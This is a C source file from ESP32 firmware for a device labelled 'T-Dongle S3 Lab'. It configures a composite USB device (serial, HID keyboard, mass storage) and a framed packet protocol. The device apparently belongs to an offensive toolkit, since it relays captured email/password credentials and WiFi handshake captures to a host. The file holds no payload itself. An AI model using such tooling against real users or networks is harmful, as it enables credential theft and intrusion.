// main/usb_protocol.c
#include "usb_protocol.h"
#include "usb_msc.h"
#include "config.h"
#include "hid_payload.h"
#include "tinyusb.h"
#include "tinyusb_default_config.h"
#include "tinyusb_cdc_acm.h"
#include "class/hid/hid_device.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/ringbuf.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "usb_protocol";

#define SYNC_BYTE 0xAA
#define USB_TX_TIMEOUT_MS 50

static SemaphoreHandle_t s_tx_mutex = NULL;
static RingbufHandle_t s_rx_ring = NULL;

// -----------------------------------------------------------------------------
// Composite Descriptor Configuration
// -----------------------------------------------------------------------------
#define CONFIG_TOTAL_LEN (TUD_CONFIG_DESC_LEN + TUD_CDC_DESC_LEN + TUD_HID_DESC_LEN + TUD_MSC_DESC_LEN)

static const uint8_t desc_configuration[] = {
    // Configuration Descriptor (Total interfaces = 4)
    TUD_CONFIG_DESCRIPTOR(1, 4, 0, CONFIG_TOTAL_LEN, 0x00, 100),

    // CDC Interface (Interface 0 and 1, Endpoints 0x81 / 0x02 / 0x82)
    TUD_CDC_DESCRIPTOR(0, 0, 0x81, 8, 0x02, 0x82, 64),

    // HID Interface (Interface 2, Keyboard Protocol, Endpoint 0x83)
    TUD_HID_DESCRIPTOR(2, 0, HID_ITF_PROTOCOL_KEYBOARD, HID_REPORT_DESC_LEN, 0x83, 8, 10),

    // MSC Interface (Interface 3, Endpoint 0x04 / 0x84)
    TUD_MSC_DESCRIPTOR(3, 0, 0x04, 0x84, 64),
};

// String Descriptors (Forces Windows to keep the same COM port)
static const char *string_desc_arr[] = {
    (const char[]){0x09, 0x04}, // 0: Language (English US)
    "M4NT1S",                   // 1: Manufacturer
    "T-Dongle S3 Lab",          // 2: Product Name
    "M4NT1S-0001",              // 3: Serial Number
};

// -----------------------------------------------------------------------------
// CRC16 & Ringbuffer Callbacks
// -----------------------------------------------------------------------------
static uint16_t crc16(const uint8_t *data, size_t len)
{
    uint16_t crc = 0xFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= (uint16_t)data[i] << 8;
        for (int b = 0; b < 8; b++) {
            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
            else              crc <<= 1;
        }
    }
    return crc;
}

uint16_t usb_protocol_crc16(const uint8_t *data, size_t len)
{
    return crc16(data, len);
}

static void cdc_rx_callback(int itf, cdcacm_event_t *event)
{
    (void)event;
    uint8_t buf[64];
    size_t rx_size = 0;
    esp_err_t ret = tinyusb_cdcacm_read(itf, buf, sizeof(buf), &rx_size);
    if (ret == ESP_OK && rx_size > 0) {
        xRingbufferSend(s_rx_ring, buf, rx_size, 0);
    }
}

int usb_protocol_read(uint8_t *buf, size_t len, TickType_t timeout)
{
    size_t out_len = 0;
    uint8_t *data = (uint8_t *)xRingbufferReceiveUpTo(s_rx_ring, &out_len,
                                                       timeout, len);
    if (!data) return 0;
    memcpy(buf, data, out_len);
    vRingbufferReturnItem(s_rx_ring, data);
    return (int)out_len;
}

int usb_protocol_write(const uint8_t *buf, size_t len, TickType_t timeout)
{
    (void)timeout;
    tinyusb_cdcacm_write_queue(0, buf, len);
    tinyusb_cdcacm_write_flush(0, 0);
    return (int)len;
}

static esp_err_t write_all(const uint8_t *data, size_t len)
{
    size_t off = 0;
    while (off < len) {
        int n = usb_protocol_write(data + off, len - off,
                                   pdMS_TO_TICKS(USB_TX_TIMEOUT_MS));
        if (n <= 0) return ESP_FAIL;
        off += (size_t)n;
    }
    return ESP_OK;
}

esp_err_t usb_protocol_init(void)
{
    s_rx_ring = xRingbufferCreate(2048, RINGBUF_TYPE_BYTEBUF);
    if (!s_rx_ring) return ESP_ERR_NO_MEM;

    s_tx_mutex = xSemaphoreCreateMutex();
    if (!s_tx_mutex) return ESP_ERR_NO_MEM;

    // Build the FAT image before driver install so it's ready on first mount.
    esp_err_t msc_ret = usb_msc_init();
    if (msc_ret != ESP_OK) {
        ESP_LOGE(TAG, "usb_msc_init failed: %s", esp_err_to_name(msc_ret));
        return msc_ret;
    }

    tinyusb_config_t tusb_cfg = TINYUSB_DEFAULT_CONFIG();
    tusb_cfg.descriptor.full_speed_config = desc_configuration;

    tusb_cfg.descriptor.string = string_desc_arr;
    tusb_cfg.descriptor.string_count = sizeof(string_desc_arr) / sizeof(string_desc_arr[0]);

    ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));

    tinyusb_config_cdcacm_t acm_cfg = {
        .cdc_port = TINYUSB_CDC_ACM_0,
        .callback_rx = &cdc_rx_callback,
        .callback_rx_wanted_char = NULL,
        .callback_line_state_changed = NULL,
        .callback_line_coding_changed = NULL,
    };
    ESP_ERROR_CHECK(tinyusb_cdcacm_init(&acm_cfg));

    return ESP_OK;
}

esp_err_t usb_send_typed_packet(uint8_t type, const uint8_t *data, size_t len)
{
    if (!s_tx_mutex) return ESP_ERR_INVALID_STATE;
    if (len > MAX_PACKET_LEN) len = MAX_PACKET_LEN;

    if (xSemaphoreTake(s_tx_mutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    uint16_t crc = crc16(data, len);

    uint8_t header[6];
    header[0] = SYNC_BYTE;
    header[1] = type;
    header[2] = (len >> 8) & 0xFF;
    header[3] = len & 0xFF;
    header[4] = (crc >> 8) & 0xFF;
    header[5] = crc & 0xFF;

    esp_err_t r = write_all(header, sizeof(header));
    if (r == ESP_OK && len > 0) r = write_all(data, len);

    xSemaphoreGive(s_tx_mutex);
    return r;
}

void usb_send_packet(const uint8_t *data, size_t len)
{
    if (len == 0) return;
    usb_send_typed_packet(USB_TYPE_FRAME, data, len);
}

void usb_send_credential(const char *email, const char *password)
{
    if (!email || !password) return;
    size_t e_len = strlen(email);
    size_t p_len = strlen(password);
    if (e_len + 1 + p_len > MAX_PACKET_LEN) return;

    char buf[MAX_PACKET_LEN];
    memcpy(buf, email, e_len);
    buf[e_len] = '\0';
    memcpy(buf + e_len + 1, password, p_len);

    usb_send_typed_packet(USB_TYPE_CREDENTIAL, (uint8_t *)buf,
                          e_len + 1 + p_len);
}

void usb_send_handshake(const char *bssid, const char *ssid, const char *path)
{
    char buf[MAX_PACKET_LEN];
    int n = snprintf(buf, sizeof(buf), "%s|%s|%s",
                     bssid ? bssid : "?",
                     ssid  ? ssid  : "?",
                     path  ? path  : "?");
    if (n <= 0 || n >= (int)sizeof(buf)) return;
    usb_send_typed_packet(USB_TYPE_HANDSHAKE, (uint8_t *)buf, (size_t)n);
}

void usb_send_status(const char *text)
{
    if (!text) return;
    size_t len = strlen(text);
    if (len == 0 || len > MAX_PACKET_LEN) return;
    usb_send_typed_packet(USB_TYPE_STATUS, (const uint8_t *)text, len);
}